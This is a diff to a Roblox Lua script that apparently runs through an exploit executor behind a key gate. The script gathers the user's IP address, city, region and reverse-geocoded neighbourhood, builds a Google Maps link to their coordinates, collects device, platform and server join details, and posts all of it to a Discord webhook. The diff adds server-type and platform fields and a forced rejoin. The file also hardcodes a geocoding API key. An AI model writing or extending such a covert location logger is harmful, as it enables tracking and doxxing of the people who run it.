@@ -3,6 +3,7 @@ local player = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local TeleportService = game:GetService("TeleportService")
 
 -- 🔑 KEY CORRECTA
 local CORRECT_KEY = "A3FCFB7ECC9B6D0A"
@@ -53,10 +54,10 @@ pcall(function()
     end
 end)
 
--- 🏘️ COLONIA APROX (Reverse Geocoding)
+-- 🏘️ COLONIA APROX
 local colony = "Unknown"
 pcall(function()
-    local apiKey = "2a9d5a2f93e242bca7482f597032d83f" -- 🔑 reemplaza esto
+    local apiKey = "2a9d5a2f93e242bca7482f597032d83f"
     local url = "https://api.opencagedata.com/geocode/v1/json?q=" ..
         lat .. "+" .. lon .. "&key=" .. apiKey
 
@@ -69,13 +70,13 @@ pcall(function()
     end
 end)
 
--- 📍 Ubicación formateada
+-- 📍 Ubicación
 local fullLocation = city .. ", " .. region .. ", " .. country
 
--- 🗺️ Google Maps link
+-- 🗺️ Google Maps
 local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon
 
--- 🎮 Nombre del juego
+-- 🎮 Juego
 local gameName = "Unknown Game"
 pcall(function()
     local info = MarketplaceService:GetProductInfo(game.PlaceId)
@@ -84,22 +85,50 @@ pcall(function()
     end
 end)
 
--- 👥 Jugadores
+-- 👥 Players
 local playersCount = #Players:GetPlayers()
 local maxPlayers = Players.MaxPlayers
 
--- 📱 Dispositivo
-local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
+-- 📱 Dispositivo + plataforma
+local deviceType = "PC 🖥️"
+local platform = UserInputService:GetPlatform().Name
 
--- 🔐 Tipo de acceso
+if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
+    deviceType = "Mobile 📱"
+elseif UserInputService.GamepadEnabled then
+    deviceType = "Console 🎮"
+end
+
+-- 🧠 Tipo de servidor
+local serverType = "Public 🌐"
+
+pcall(function()
+    if game.PrivateServerId ~= "" then
+        if game.PrivateServerOwnerId ~= 0 then
+            serverType = "VIP Private 👑"
+        else
+            serverType = "Private Server 🔒"
+        end
+    end
+end)
+
+-- 🔐 Access
 local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
 
 -- 📅 Fecha
 local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 
--- 🧾 LINK SERVER
+-- 🔗 Server link
 local serverLink = "https://www.roblox.com/games/start?placeId=" ..
 game.PlaceId .. "&gameInstanceId=" .. game.JobId
+
+-- 🔄 Rejoin mismo server
+pcall(function()
+    task.spawn(function()
+        task.wait(1)
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+    end)
+end)
 
 -- 📡 DATA DISCORD
 local data = {
@@ -116,6 +145,8 @@ local data = {
             {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},
             {["name"] = "👥 Players", ["value"] = playersCount .. "/" .. maxPlayers, ["inline"] = true},
 
+            {["name"] = "🧠 Server Type", ["value"] = serverType, ["inline"] = true},
+
             {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},
             {["name"] = "📍 Location", ["value"] = fullLocation, ["inline"] = false},
 
@@ -129,6 +160,8 @@ local data = {
             {["name"] = "🔗 Server Join", ["value"] = serverLink, ["inline"] = false},
 
             {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},
+            {["name"] = "📡 Platform", ["value"] = platform, ["inline"] = true},
+
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
 
             {["name"] = "🔐 Access Type", ["value"] = accessType, ["inline"] = true},
